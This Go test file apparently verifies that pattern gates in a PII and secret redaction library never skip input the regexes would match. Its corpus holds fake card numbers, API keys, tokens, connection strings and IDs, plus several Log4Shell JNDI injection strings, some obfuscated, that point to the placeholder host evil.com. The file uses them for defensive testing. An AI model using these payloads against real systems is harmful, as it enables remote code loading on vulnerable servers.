package internal

import (
	"math/rand"
	"regexp"
	"strings"
	"testing"
)

// gateCorpus holds inputs exercising every built-in pattern family, including
// true positives (a too-strict gate would wrongly skip them) and near-miss
// negatives. Every entry must satisfy: for each pattern, if its gate rejects
// the input's features, the pattern must not match the input.
var gateCorpus = []string{
	// Cards / SSN / financial identifiers
	"card 4532015112830366 was charged",
	"4532015112830366",
	"4532 0151 1283 0366",
	"4532-0151-1283-0366",
	"credit_card=4111111111111111",
	"ssn 123-45-6789",
	"123-45-6789",
	"ein 12-3456789",
	"12-3456789",
	"iban DE89370400440532013000",
	"GB29 NWBK 6016 1331 9268 19",
	"swift: DEUTDEFF500",
	"bic DEUTDEFF",
	"bank_code: MIDLGB22",
	"cvv: 123",
	"cvc=4567",
	"security_code 999",
	"card_verification 1234",
	// Credentials / secrets / tokens
	"password: hunter2",
	"passwd=hunter2",
	"pwd: x",
	"secret: abc",
	"token: abcdefghijklmnopqrstuvwxyz",
	"api_key=abcdefgh12345678",
	"bearer somecredentialvalue",
	"refresh_token=abcdefghijklmnopqrstuvwxyz",
	"access_token: abcdefghijklmnopqrstuv",
	"auth_token abcdefghijklmnop",
	"sk-abcdefghijklmnopqrstuvwxyz",
	"sk-ant-api03-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
	"sk-proj-abcdefghijklmnopqrstuv",
	"AKIAIOSFODNN7EXAMPLE",
	"ASIAIOSFODNN7EXAMPLE",
	"AIzaSyA1234567890abcdefghijklmnopqrstuv",
	"ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345",
	"gho_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345",
	// Fake tokens; prefixes split so GitHub push protection doesn't
	// flag these literals in source.
	"xox" + "b-123456789012-123456789012-abcdefghijklmnopqrstuvwx",
	"sk_" + "live_abcdefghijklmnopqrstuvwxyz012345",
	"rk_" + "live_abcdefghijklmnopqrstuvwxyz012345",
	"glpat-abcdefghijklmnopqrst",
	"ya29.a0AfH6SMBabcdefghijklmno",
	"1//0abcdefghij-abcdefghijklmnopqrstuvwx",
	"FwoGZXIvYXdzEAxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
	"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
	`{"private_key": "-----BEGIN RSA PRIVATE KEY-----MIIE-----END-----"}`,
	"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA\n-----END RSA PRIVATE KEY-----",
	// Emails / hosts / connection strings
	"email foo.bar@example.com",
	"user@host",
	"root:toor@127.0.0.1:5432/db",
	"mysql://user:pass@localhost:3306/db",
	"postgresql://u:p@h/db",
	"jdbc:postgresql://host:5432/db",
	"server=db-primary;user=app",
	"data source=myserver;uid=x",
	"host=10.0.0.1 port=5432",
	"oracle: orclpdb1",
	"tns:_listener = xyz",
	"sid: ORCL",
	"amqp://guest:guest@localhost:5672/",
	"amqps://user:pass@mq.example.com:5671/vhost",
	"nats://nats.io:4222",
	"kafka broker-1:9092",
	"bootstrap_server=broker:9092",
	"connection_string=abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrst",
	"connstr: abcdefghijklmnopqrstuvwxyzabcdefghijklmnop",
	"azure_connection blahblah",
	"ldap://evil.com/a",
	"ldaps://evil.com",
	"rmi://host:1099/obj",
	"dns://resolver/8.8.8.8",
	// Phones
	"phone: 415-555-2671",
	"mobile=+14155552671",
	"tel (415) 555-2671",
	"telephone 415.555.2671",
	"+14155552671",
	"+44 20 7946 0958",
	"0044 20 7946 0958",
	"00442079460958",
	"415-555-2671",
	"555 1234",
	"0800 123 4567",
	// IPs
	"ip 192.168.1.100 blocked",
	"10.0.0.1",
	"2001:0db8:85a3:0000:0000:8a2e:0370:7334",
	"2001:db8::8a2e:370:7334",
	"::1",
	"fe80::",
	"::ffff:192.168.1.1",
	"2001:db8:85a3::8a2e:370:7334",
	// JNDI / Log4Shell
	"${jndi:ldap://evil.com/a}",
	"${jndi:rmi://evil.com}",
	"${lower:j}",
	"${upper:J}ndi",
	"${${lower:j}ndi:ldap://evil.com}",
	// Healthcare / identity
	"diagnosis: A12.3",
	"icd10: S72.0",
	"dx A12",
	"clinical_code B24.9",
	"npi: 1234567890",
	"provider_id 1234567893",
	"mrn: ABC123456",
	"patient_id=XY987654",
	"health_record Z098765",
	"123456789A",
	"passport_number 123456789",
	"passport: 12345678",
	"driver_license D1234567",
	"dl_number X1234567",
	"license_number AB123456",
	"QQ123456C",
	"sin 123-456-789",
	"canadian_sin 123456789",
	"social_insurance_number 123 456 789",
	// Separator-less / hyphenated keyword forms: the pattern alternations use
	// [_-]? separators, so the hyphen and no-separator spellings must also pass
	// the keyword gates (they contain none of the underscore-only keywords).
	"social-insurance-number: 123-456-789",
	"socialinsurancenumber=123 456 789",
	"dlnumber: X1234567",
	"dl-number Y1234567",
	"fpid: ABCDEFGHIJ12",
	// International identifiers
	"51 824 753 556",
	"12.345.678-5",
	"123.456.789-09",
	"ABC123456XYZ",
	"&ABC123456XXX",
	// Biometrics
	"fingerprint_template: abcdefghijklmno",
	"fp_id=abcdefghijkl",
	"face_template abcdefghijklmno",
	"face_id: abcdefghijkl",
	"biometric_data abcdefghijklmnopqrst",
	"bio_hash=abcdefghijklmnopqr",
	// Benign traffic (no gate should be needed, but they must still filter correctly)
	"User john performed action 42",
	"request 200 OK in 34ms",
	"2026-08-30T15:04:05Z startup complete",
	"iteration count 1000000 exceeded threshold 5",
	"",
	"a",
	"1",
	"no digits here at all",
	"mixed Case TEXT with 12 and 34 numbers",
	"customer id 4711 ordered 2 items, total 99",
	"version 1.2.3 build 456",
	"error rate 0.25% over 300 seconds",
	"EEEE WWWW CCCC 1234",
	"ABC-DEF-GHIJ",
}

// TestPatternGateEquivalence is the SECURITY proof for pattern gating:
// for every pattern and every corpus input, a gate rejection must imply the
// pattern does not match. A failure means a gate is too strict and would
// silently disable redaction for that input class.
func TestPatternGateEquivalence(t *testing.T) {
	InitPatterns()

	for i, pd := range AllPatterns {
		re, err := regexp.Compile(pd.Pattern)
		if err != nil {
			continue
		}
		gate := pd.Gate
		for _, input := range gateCorpus {
			if gate.Allows(ScanMessageFeatures(input)) {
				continue
			}
			if re.MatchString(input) {
				t.Errorf("pattern %d %q: gate rejected input %q which the pattern matches — gate is unsound", i, pd.Pattern, input)
			}
		}
	}
}

// TestPatternGateEquivalenceFuzz repeats the soundness invariant on
// deterministic pseudo-random strings over an alphabet biased toward pattern
// structure (digits, separators, keyword fragments).
func TestPatternGateEquivalenceFuzz(t *testing.T) {
	InitPatterns()

	rng := rand.New(rand.NewSource(42)) //nolint:gosec // deterministic test data, not security use
	letters := []byte("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_.:@+/()$ {}=&%")
	keywords := []string{"password", "card", "phone", "swift", "cvv", "npi", "mrn", "passport", "host", "jndi", "sk-", "AKIA", "eyJ", "xox", "_live_", "BEGIN", "token", "bearer", "sin", "kafka", "face"}

	// Compile once outside the loop; skip uncompilable patterns entirely.
	type gatedPattern struct {
		index int
		re    *regexp.Regexp
		gate  PatternGate
	}
	compiled := make([]gatedPattern, 0, len(AllPatterns))
	for i, pd := range AllPatterns {
		re, err := regexp.Compile(pd.Pattern)
		if err != nil {
			continue
		}
		compiled = append(compiled, gatedPattern{index: i, re: re, gate: pd.Gate})
	}

	gen := func() string {
		var sb strings.Builder
		n := rng.Intn(60)
		for range n {
			if rng.Intn(6) == 0 {
				sb.WriteString(keywords[rng.Intn(len(keywords))])
			} else {
				sb.WriteByte(letters[rng.Intn(len(letters))])
			}
		}
		return sb.String()
	}

	for range 20000 {
		input := gen()
		features := ScanMessageFeatures(input)
		for _, gp := range compiled {
			if gp.gate.Allows(features) {
				continue
			}
			if gp.re.MatchString(input) {
				t.Fatalf("fuzz: pattern %d %q: gate rejected input %q which the pattern matches — gate is unsound", gp.index, AllPatterns[gp.index].Pattern, input)
			}
		}
	}
}
